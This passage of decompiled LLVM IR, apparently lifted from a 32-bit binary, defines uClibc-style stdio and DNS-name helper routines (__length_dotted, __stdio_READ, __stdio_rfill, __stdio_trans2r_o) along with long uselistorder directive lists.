  uselistorder i32* @esi, { 142, 143, 144, 145, 146, 147, 36, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 37, 54, 55, 10, 5, 62, 56, 59, 57, 58, 6, 60, 61, 168, 11, 169, 170, 173, 171, 172, 180, 174, 175, 176, 177, 178, 179, 181, 182, 183, 184, 185, 186, 187, 12, 7, 188, 189, 190, 191, 192, 13, 33, 193, 194, 195, 196, 197, 198, 14, 199, 200, 201, 202, 203, 204, 15, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 16, 219, 220, 221, 222, 223, 17, 18, 224, 19, 225, 226, 228, 227, 8, 229, 230, 231, 232, 233, 234, 235, 236, 0, 38, 237, 238, 239, 240, 241, 242, 103, 104, 105, 106, 107, 361, 362, 363, 364, 243, 244, 245, 246, 247, 20, 248, 249, 250, 251, 252, 253, 254, 329, 330, 331, 365, 366, 367, 368, 369, 394, 377, 380, 381, 382, 122, 123, 124, 125, 126, 127, 128, 370, 375, 376, 63, 64, 65, 66, 67, 68, 133, 134, 135, 1, 136, 137, 138, 69, 70, 71, 72, 73, 332, 337, 21, 338, 339, 340, 341, 342, 343, 344, 333, 334, 335, 336, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 22, 356, 39, 357, 358, 359, 360, 310, 311, 312, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 9, 383, 23, 384, 385, 255, 24, 256, 40, 34, 313, 314, 327, 328, 392, 393, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 26, 268, 2, 270, 271, 272, 273, 25, 274, 275, 269, 276, 277, 278, 279, 3, 280, 281, 282, 283, 284, 285, 286, 35, 27, 287, 288, 28, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 29, 306, 307, 308, 30, 53, 289, 4, 290, 291, 31, 32, 309, 371, 372, 373, 374, 386, 387, 388, 389, 390, 391, 129, 130, 131, 132, 378, 379, 325, 326, 74, 75, 76, 77, 80, 78, 79, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 139, 140, 141, 395 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_8058945, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_805895e = icmp eq i32 %arg1, 0
  br i1 %v1_805895e, label %dec_label_pc_805898d, label %dec_label_pc_805897e.preheader

dec_label_pc_805897e.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_805897e10 = add i32 %arg2, %arg1
  %v3_805897e11 = inttoptr i32 %v2_805897e10 to i8*
  %v4_805897e12 = load i8, i8* %v3_805897e11, align 1
  %v1_805898214 = add i32 %arg2, 1
  %v1_805898515 = icmp eq i8 %v4_805897e12, 0
  %v1_805898716 = icmp eq i1 %v1_805898515, false
  br i1 %v1_805898716, label %dec_label_pc_805896d, label %dec_label_pc_8058989

dec_label_pc_8058964:                             ; preds = %dec_label_pc_805896d
  %v1_8058964 = add i32 %v0_805896417, 2
  br label %dec_label_pc_8058989

dec_label_pc_805896d:                             ; preds = %dec_label_pc_805897e.preheader, %dec_label_pc_805897e
  %v1_805898219 = phi i32 [ %v1_8058982, %dec_label_pc_805897e ], [ %v1_805898214, %dec_label_pc_805897e.preheader ]
  %v5_805897e18.in = phi i8 [ %v4_805897e, %dec_label_pc_805897e ], [ %v4_805897e12, %dec_label_pc_805897e.preheader ]
  %v0_805896417 = phi i32 [ %v2_805897b, %dec_label_pc_805897e ], [ %arg2, %dec_label_pc_805897e.preheader ]
  %v5_805897e18 = zext i8 %v5_805897e18.in to i32
  %v1_805896f = and i32 %v5_805897e18, 192
  %v6_8058974 = icmp eq i32 %v1_805896f, 192
  %v2_805897b = add i32 %v5_805897e18, %v1_805898219
  br i1 %v6_8058974, label %dec_label_pc_8058964, label %dec_label_pc_805897e

dec_label_pc_805897e:                             ; preds = %dec_label_pc_805896d
  store i32 %v2_805897b, i32* @ecx, align 4
  %v2_805897e = add i32 %v2_805897b, %arg1
  %v3_805897e = inttoptr i32 %v2_805897e to i8*
  %v4_805897e = load i8, i8* %v3_805897e, align 1
  %v1_8058982 = add i32 %v2_805897b, 1
  %v1_8058985 = icmp eq i8 %v4_805897e, 0
  %v1_8058987 = icmp eq i1 %v1_8058985, false
  br i1 %v1_8058987, label %dec_label_pc_805896d, label %dec_label_pc_8058989

dec_label_pc_8058989:                             ; preds = %dec_label_pc_805897e.preheader, %dec_label_pc_805897e, %dec_label_pc_8058964
  %v0_8058989 = phi i32 [ %v1_8058964, %dec_label_pc_8058964 ], [ %v1_805898214, %dec_label_pc_805897e.preheader ], [ %v1_8058982, %dec_label_pc_805897e ]
  %v2_805898b = sub i32 %v0_8058989, %arg2
  br label %dec_label_pc_805898d

dec_label_pc_805898d:                             ; preds = %entry, %dec_label_pc_8058989
  %v0_8058990 = phi i32 [ -1, %entry ], [ %v2_805898b, %dec_label_pc_8058989 ]
  ret i32 %v0_8058990

; uselistorder directives
  uselistorder i8 %v4_805897e, { 1, 0 }
  uselistorder i32 %v2_805897b, { 2, 3, 1, 0 }
  uselistorder i32 192, { 1, 3, 2, 4, 0 }
  uselistorder i32 2, { 153, 62, 154, 155, 156, 89, 158, 159, 59, 60, 61, 0, 1, 157, 160, 161, 162, 133, 163, 164, 165, 166, 167, 168, 138, 2, 139, 140, 66, 169, 170, 3, 90, 67, 4, 5, 171, 172, 173, 85, 174, 175, 176, 177, 134, 192, 193, 72, 178, 179, 86, 14, 15, 76, 77, 200, 73, 132, 13, 91, 129, 92, 130, 93, 131, 68, 16, 142, 64, 94, 95, 6, 96, 7, 97, 8, 98, 99, 17, 18, 78, 19, 20, 195, 21, 22, 87, 23, 186, 187, 188, 189, 9, 79, 147, 148, 190, 191, 69, 70, 71, 24, 201, 80, 180, 181, 75, 25, 26, 182, 27, 183, 28, 81, 184, 185, 29, 194, 199, 88, 30, 141, 102, 100, 101, 103, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 10, 143, 42, 43, 44, 11, 144, 45, 46, 47, 48, 49, 145, 104, 50, 146, 105, 51, 82, 52, 53, 54, 55, 56, 57, 106, 107, 108, 109, 83, 110, 111, 112, 121, 74, 113, 114, 115, 116, 117, 120, 118, 119, 135, 136, 137, 122, 123, 149, 63, 150, 12, 151, 124, 65, 152, 125, 126, 127, 198, 84, 196, 58, 197, 128 }
  uselistorder i32* @ecx, { 26, 5, 7, 25, 6, 0, 61, 62, 63, 64, 13, 65, 66, 67, 68, 14, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 36, 43, 37, 38, 39, 40, 41, 42, 85, 86, 8, 9, 50, 1, 51, 87, 88, 89, 11, 17, 90, 91, 15, 10, 16, 92, 93, 94, 95, 96, 97, 163, 164, 165, 166, 12, 52, 2, 53, 98, 99, 30, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 27, 126, 127, 128, 129, 28, 130, 24, 18, 45, 46, 47, 48, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 19, 191, 167, 168, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 20, 207, 208, 210, 211, 212, 213, 209, 216, 156, 157, 158, 159, 160, 161, 162, 31, 32, 131, 132, 133, 134, 135, 136, 137, 29, 138, 139, 140, 141, 142, 143, 21, 22, 3, 4, 144, 145, 23, 146, 147, 148, 149, 150, 152, 153, 154, 34, 35, 151, 155, 214, 215, 217, 218, 219, 33, 44, 49, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805898d, { 1, 0 }
  uselistorder label %dec_label_pc_8058989, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805896d, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058994 = load i32, i32* @ebx, align 4
  store i32 %v0_8058994, i32* %stack_var_-4, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v4_805899a = ptrtoint i16* %arg1 to i32
  store i32 %v4_805899a, i32* @ebx, align 4
  %v1_80589a2 = bitcast i16* %arg1 to i8*
  %v2_80589a2 = load i8, i8* %v1_80589a2, align 1
  %v3_80589a2 = and i8 %v2_80589a2, 4
  %v4_80589a2 = icmp eq i8 %v3_80589a2, 0
  %v1_80589a5 = icmp eq i1 %v4_80589a2, false
  br i1 %v1_80589a5, label %dec_label_pc_80589dd, label %dec_label_pc_80589a7

dec_label_pc_80589a7:                             ; preds = %entry
  %v2_80589a7 = icmp slt i32 %arg3, 0
  %v3_80589ae = select i1 %v2_80589a7, i32 2147483647, i32 %arg3
  %v1_80589b7 = add i32 %v4_805899a, 4
  %v2_80589b7 = inttoptr i32 %v1_80589b7 to i32*
  %v3_80589b7 = load i32, i32* %v2_80589b7, align 4
  %v3_80589ba = inttoptr i32 %arg2 to i32*
  %v4_80589ba = call i32 @__libc_read(i32 %v3_80589b7, i32* %v3_80589ba, i32 %v3_80589ae)
  store i32 %v4_80589ba, i32* %ecx.global-to-local, align 4
  %tmp11 = icmp slt i32 %v4_80589ba, 1
  %tmp12 = icmp eq i1 %tmp11, false
  br i1 %tmp12, label %dec_label_pc_80589dd, label %dec_label_pc_80589c9

dec_label_pc_80589c9:                             ; preds = %dec_label_pc_80589a7
  %v1_80589c2 = icmp eq i32 %v4_80589ba, 0
  %v4_80589c7 = icmp eq i1 %v1_80589c2, false
  %v0_80589c9 = load i32, i32* @ebx, align 4
  %v1_80589c9 = inttoptr i32 %v0_80589c9 to i32*
  %v2_80589c9 = load i32, i32* %v1_80589c9, align 4
  br i1 %v4_80589c7, label %dec_label_pc_80589d5, label %dec_label_pc_80589cd

dec_label_pc_80589cd:                             ; preds = %dec_label_pc_80589c9
  %v1_80589cd = or i32 %v2_80589c9, 4
  %v1_80589d0 = trunc i32 %v1_80589cd to i16
  %v3_80589d0 = inttoptr i32 %v0_80589c9 to i16*
  store i16 %v1_80589d0, i16* %v3_80589d0, align 2
  br label %dec_label_pc_80589dd

dec_label_pc_80589d5:                             ; preds = %dec_label_pc_80589c9
  %v1_80589d5 = or i32 %v2_80589c9, 8
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_80589da = trunc i32 %v1_80589d5 to i16
  %v3_80589da = inttoptr i32 %v0_80589c9 to i16*
  store i16 %v1_80589da, i16* %v3_80589da, align 2
  br label %dec_label_pc_80589dd

dec_label_pc_80589dd:                             ; preds = %dec_label_pc_80589a7, %entry, %dec_label_pc_80589cd, %dec_label_pc_80589d5
  %v0_80589de = load i32, i32* %ecx.global-to-local, align 4
  %v2_80589e1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80589e1, i32* @ebx, align 4
  ret i32 %v0_80589de

; uselistorder directives
  uselistorder i32 %v4_80589ba, { 2, 0, 1 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 4, { 246, 247, 248, 249, 71, 256, 257, 258, 252, 250, 251, 253, 254, 255, 0, 6, 259, 260, 261, 262, 263, 264, 265, 266, 267, 33, 53, 143, 144, 145, 34, 35, 36, 268, 48, 1, 199, 7, 8, 269, 270, 271, 272, 273, 54, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 60, 286, 287, 288, 289, 72, 37, 290, 291, 292, 293, 38, 39, 40, 73, 41, 42, 74, 43, 294, 44, 295, 75, 45, 76, 77, 9, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 55, 306, 387, 307, 388, 389, 395, 396, 401, 402, 403, 390, 49, 99, 216, 217, 391, 392, 393, 394, 10, 146, 147, 148, 149, 78, 220, 221, 222, 61, 239, 240, 241, 242, 150, 151, 152, 153, 154, 62, 11, 155, 156, 397, 399, 341, 342, 343, 344, 345, 346, 12, 347, 348, 349, 350, 351, 352, 353, 354, 339, 340, 355, 51, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 31, 376, 377, 52, 378, 13, 157, 398, 218, 219, 329, 330, 50, 331, 332, 333, 334, 2, 14, 3, 335, 63, 158, 64, 400, 15, 308, 16, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 46, 47, 100, 79, 326, 327, 328, 159, 160, 161, 17, 162, 18, 32, 19, 20, 163, 164, 21, 165, 80, 166, 81, 167, 168, 82, 169, 170, 83, 171, 172, 173, 84, 174, 175, 176, 177, 178, 95, 179, 180, 181, 182, 183, 184, 185, 56, 186, 187, 188, 189, 190, 96, 191, 192, 193, 194, 195, 196, 197, 57, 198, 200, 201, 202, 58, 203, 204, 205, 65, 66, 67, 206, 85, 86, 87, 88, 89, 68, 207, 90, 208, 69, 209, 210, 59, 211, 212, 213, 70, 214, 215, 91, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 97, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 223, 224, 225, 226, 227, 228, 229, 230, 231, 22, 23, 232, 233, 234, 235, 236, 237, 238, 4, 243, 24, 25, 244, 26, 92, 93, 98, 245, 94, 336, 337, 27, 5, 28, 29, 338, 30, 379, 380, 381, 382, 383, 384, 385, 386, 404, 405, 406, 142 }
  uselistorder i32 2147483647, { 2, 0, 1, 3 }
  uselistorder i8 0, { 133, 39, 4, 7, 8, 40, 6, 5, 134, 135, 136, 10, 142, 137, 138, 9, 140, 141, 139, 31, 143, 1, 2, 80, 81, 82, 144, 145, 34, 146, 11, 13, 113, 112, 12, 41, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 16, 166, 162, 163, 161, 14, 164, 165, 15, 32, 167, 168, 169, 170, 171, 172, 173, 236, 237, 18, 115, 114, 17, 116, 117, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 3, 190, 191, 192, 258, 193, 261, 42, 59, 37, 38, 95, 19, 260, 242, 243, 244, 245, 246, 247, 248, 249, 43, 250, 228, 21, 125, 126, 20, 194, 195, 60, 29, 28, 0, 44, 45, 46, 196, 227, 231, 232, 197, 198, 199, 200, 201, 202, 203, 204, 205, 22, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 30, 219, 220, 221, 222, 223, 224, 225, 226, 78, 259, 124, 83, 84, 23, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 47, 109, 110, 111, 48, 118, 119, 120, 121, 122, 123, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 35, 127, 128, 129, 130, 131, 132, 229, 230, 233, 234, 235, 24, 238, 239, 36, 240, 33, 241, 251, 256, 255, 25, 252, 253, 27, 254, 26, 257, 79, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58 }
  uselistorder i8 4, { 5, 0, 6, 3, 4, 2, 1 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80589dd, { 3, 2, 0, 1 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_80589e4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80589ec = add i32 %arg1, 8
  %v2_80589ec = inttoptr i32 %v1_80589ec to i32*
  %v3_80589ec = load i32, i32* %v2_80589ec, align 4
  store i32 %v3_80589ec, i32* %edx.global-to-local, align 4
  %v1_80589ef = add i32 %arg1, 12
  %v2_80589ef = inttoptr i32 %v1_80589ef to i32*
  %v3_80589ef = load i32, i32* %v2_80589ef, align 4
  %v2_80589f2 = sub i32 %v3_80589ef, %v3_80589ec
  %v3_80589f7 = inttoptr i32 %arg1 to i16*
  %v4_80589f7 = call i32 @__stdio_READ(i16* %v3_80589f7, i32 %v3_80589ec, i32 %v2_80589f2)
  %v0_80589fc = load i32, i32* @ebx, align 4
  %v1_80589fc = add i32 %v0_80589fc, 8
  %v2_80589fc = inttoptr i32 %v1_80589fc to i32*
  %v3_80589fc = load i32, i32* %v2_80589fc, align 4
  store i32 %v3_80589fc, i32* %edx.global-to-local, align 4
  %v2_80589ff = add i32 %v0_80589fc, 16
  %v3_80589ff = inttoptr i32 %v2_80589ff to i32*
  store i32 %v3_80589fc, i32* %v3_80589ff, align 4
  %v0_8058a02 = load i32, i32* %edx.global-to-local, align 4
  %v2_8058a02 = add i32 %v0_8058a02, %v4_80589f7
  store i32 %v2_8058a02, i32* %edx.global-to-local, align 4
  %v1_8058a04 = load i32, i32* @ebx, align 4
  %v2_8058a04 = add i32 %v1_8058a04, 20
  %v3_8058a04 = inttoptr i32 %v2_8058a04 to i32*
  store i32 %v2_8058a02, i32* %v3_8058a04, align 4
  store i32 %v0_80589e4, i32* @ebx, align 4
  ret i32 %v4_80589f7

; uselistorder directives
  uselistorder i32 %v4_80589f7, { 1, 0 }
  uselistorder i32 20, { 21, 22, 23, 24, 25, 26, 27, 2, 28, 29, 4, 30, 3, 31, 32, 1, 7, 8, 19, 9, 33, 34, 35, 36, 37, 5, 38, 39, 40, 10, 11, 12, 13, 14, 15, 16, 17, 18, 6, 20, 0 }
  uselistorder i32 16, { 69, 70, 71, 72, 73, 75, 74, 0, 76, 77, 11, 6, 78, 12, 79, 80, 81, 10, 7, 82, 83, 84, 85, 86, 87, 88, 89, 96, 90, 91, 92, 93, 94, 95, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 139, 13, 14, 29, 18, 42, 30, 40, 62, 41, 143, 137, 2, 1, 138, 4, 3, 134, 135, 15, 144, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 19, 130, 131, 132, 133, 140, 141, 142, 28, 20, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 21, 57, 58, 59, 16, 22, 60, 23, 61, 24, 17, 31, 32, 33, 34, 35, 36, 37, 38, 39, 63, 64, 9, 65, 66, 67, 68, 5, 25, 136, 8, 26, 27 }
  uselistorder i32 12, { 72, 73, 74, 75, 76, 0, 77, 17, 40, 1, 78, 79, 99, 24, 22, 7, 23, 8, 9, 10, 11, 12, 13, 14, 80, 81, 82, 83, 84, 85, 86, 87, 2, 18, 19, 88, 89, 90, 133, 27, 41, 65, 71, 42, 43, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 25, 132, 95, 96, 97, 98, 134, 91, 3, 4, 92, 93, 15, 16, 94, 5, 26, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 20, 60, 61, 21, 62, 63, 64, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 66, 67, 68, 69, 70, 6 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8058a0c = load i32, i32* @ebx, align 4
  %v4_8058a10 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8058a10, i32* @ebx, align 4
  %v2_8058a18 = load i16, i16* %arg1, align 2
  %v3_8058a18 = zext i16 %v2_8058a18 to i32
  %v2_8058a1b = and i32 %v3_8058a18, %arg2
  %v3_8058a1b = icmp eq i32 %v2_8058a1b, 0
  %v1_8058a1d = icmp eq i1 %v3_8058a1b, false
  br i1 %v1_8058a1d, label %dec_label_pc_8058a2b, label %dec_label_pc_8058a1f

dec_label_pc_8058a1f:                             ; preds = %entry
  %v1_8058a1f = and i32 %v3_8058a18, 2176
  %v2_8058a1f = icmp eq i32 %v1_8058a1f, 0
  %v1_8058a24 = icmp eq i1 %v2_8058a1f, false
  br i1 %v1_8058a24, label %dec_label_pc_8058a32, label %dec_label_pc_8058a26

dec_label_pc_8058a26:                             ; preds = %dec_label_pc_8058a1f
  %v2_8058a26 = or i32 %v3_8058a18, %arg2
  %v1_8058a28 = trunc i32 %v2_8058a26 to i16
  store i16 %v1_8058a28, i16* %arg1, align 2
  %v0_8058a2b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8058a2b

dec_label_pc_8058a2b:                             ; preds = %entry, %dec_label_pc_8058a26
  %v0_8058a51 = phi i32 [ %v4_8058a10, %entry ], [ %v0_8058a2b.pre, %dec_label_pc_8058a26 ]
  %v1_8058a2b = inttoptr i32 %v0_8058a51 to i16*
  %v2_8058a2b = load i16, i16* %v1_8058a2b, align 2
  %v2_8058a2e = and i16 %v2_8058a2b, 16
  %v3_8058a2e = icmp eq i16 %v2_8058a2e, 0
  br i1 %v3_8058a2e, label %dec_label_pc_8058a4a, label %dec_label_pc_8058a32

dec_label_pc_8058a32:                             ; preds = %dec_label_pc_8058a2b, %dec_label_pc_8058a1f
  %v1_8058a32 = call i32 @__errno_location(i32 %v0_8058a0c)
  %v1_8058a37 = inttoptr i32 %v1_8058a32 to i32*
  store i32 9, i32* %v1_8058a37, align 4
  br label %dec_label_pc_8058a3d

dec_label_pc_8058a3d:                             ; preds = %dec_label_pc_8058a4e, %dec_label_pc_8058a32
  %v0_8058a3d = load i32, i32* @ebx, align 4
  %v1_8058a3d = inttoptr i32 %v0_8058a3d to i32*
  %v2_8058a3d = load i32, i32* %v1_8058a3d, align 4
  %v1_8058a3f = or i32 %v2_8058a3d, 8
  %v1_8058a42 = trunc i32 %v1_8058a3f to i16
  %v3_8058a42 = inttoptr i32 %v0_8058a3d to i16*
  store i16 %v1_8058a42, i16* %v3_8058a42, align 2
  br label %dec_label_pc_8058a76

dec_label_pc_8058a4a:                             ; preds = %dec_label_pc_8058a2b
  %v2_8058a4a = and i16 %v2_8058a2b, 64
  %v3_8058a4a = icmp eq i16 %v2_8058a4a, 0
  br i1 %v3_8058a4a, label %dec_label_pc_8058a6c, label %dec_label_pc_8058a4e

dec_label_pc_8058a4e:                             ; preds = %dec_label_pc_8058a4a
  %v2_8058a52 = call i32 @__stdio_wcommit(i32 %v0_8058a51)
  %v1_8058a5a = icmp eq i32 %v2_8058a52, 0
  %v1_8058a5c = icmp eq i1 %v1_8058a5a, false
  br i1 %v1_8058a5c, label %dec_label_pc_8058a3d, label %dec_label_pc_8058a5e

dec_label_pc_8058a5e:                             ; preds = %dec_label_pc_8058a4e
  %v0_8058a5e = load i32, i32* @ebx, align 4
  %v1_8058a5e = add i32 %v0_8058a5e, 8
  %v2_8058a5e = inttoptr i32 %v1_8058a5e to i32*
  %v3_8058a5e = load i32, i32* %v2_8058a5e, align 4
  %v2_8058a61 = add i32 %v0_8058a5e, 28
  %v3_8058a61 = inttoptr i32 %v2_8058a61 to i32*
  store i32 %v3_8058a5e, i32* %v3_8058a61, align 4
  %v0_8058a64 = load i32, i32* @ebx, align 4
  %v1_8058a64 = inttoptr i32 %v0_8058a64 to i32*
  %v2_8058a64 = load i32, i32* %v1_8058a64, align 4
  %v2_8058a64.tr = trunc i32 %v2_8058a64 to i16
  %v1_8058a69 = and i16 %v2_8058a64.tr, -65
  %v3_8058a69 = inttoptr i32 %v0_8058a64 to i16*
  store i16 %v1_8058a69, i16* %v3_8058a69, align 2
  %v0_8058a6c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8058a6c

dec_label_pc_8058a6c:                             ; preds = %dec_label_pc_8058a4a, %dec_label_pc_8058a5e
  %v2_8058a71 = phi i32 [ %v0_8058a51, %dec_label_pc_8058a4a ], [ %v0_8058a6c.pre, %dec_label_pc_8058a5e ]
  %v1_8058a6c = inttoptr i32 %v2_8058a71 to i32*
  %v2_8058a6c = load i32, i32* %v1_8058a6c, align 4
  %v1_8058a6e = or i32 %v2_8058a6c, 1
  %v1_8058a71 = trunc i32 %v1_8058a6e to i16
  %v3_8058a71 = inttoptr i32 %v2_8058a71 to i16*
  store i16 %v1_8058a71, i16* %v3_8058a71, align 2
  br label %dec_label_pc_8058a76

dec_label_pc_8058a76:                             ; preds = %dec_label_pc_8058a3d, %dec_label_pc_8058a6c
  %storemerge = phi i32 [ 0, %dec_label_pc_8058a6c ], [ -1, %dec_label_pc_8058a3d ]
  %v2_8058a76 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8058a76, i32* @edx, align 4
  store i32 %v0_8058a0c, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8058a18, { 0, 2, 1 }
  uselistorder i32 %v0_8058a0c, { 1, 0 }
  uselistorder i32* @edx, { 297, 4, 298, 299, 300, 301, 302, 303, 304, 305, 5, 306, 307, 308, 309, 310, 311, 16, 314, 312, 313, 315, 316, 317, 318, 319, 320, 321, 24, 28, 25, 26, 27, 322, 323, 324, 325, 326, 327, 328, 335, 329, 330, 331, 332, 333, 334, 1, 17, 64, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 353, 350, 351, 352, 354, 355, 356, 357, 407, 6, 2, 18, 65, 358, 359, 360, 361, 362, 363, 364, 365, 475, 476, 477, 478, 7, 479, 480, 398, 412, 74, 413, 29, 482, 30, 483, 414, 485, 486, 493, 492, 75, 38, 76, 77, 78, 79, 80, 81, 31, 417, 418, 8, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 9, 432, 433, 415, 416, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 10, 459, 460, 461, 462, 463, 488, 82, 399, 400, 402, 403, 404, 0, 401, 406, 366, 367, 368, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 15, 386, 387, 369, 388, 11, 389, 390, 392, 12, 393, 394, 395, 396, 397, 23, 13, 391, 484, 14, 83, 408, 409, 481, 84, 487, 405, 489, 474, 410, 411, 294, 32, 490, 491, 33, 34, 35, 36, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 66, 67, 68, 69, 70, 71, 72, 73, 19, 20, 21, 22, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 295, 296, 464, 465, 466, 467, 469, 473, 468, 471, 472, 3, 470, 494 }
  uselistorder i32 28, { 22, 23, 24, 17, 18, 25, 26, 27, 28, 45, 36, 29, 30, 0, 31, 32, 33, 34, 35, 4, 5, 6, 2, 37, 16, 38, 39, 40, 41, 42, 43, 3, 44, 46, 19, 20, 7, 8, 21, 13, 12, 10, 11, 14, 15, 9, 1 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 6, 5, 4, 3, 1, 0, 2 }
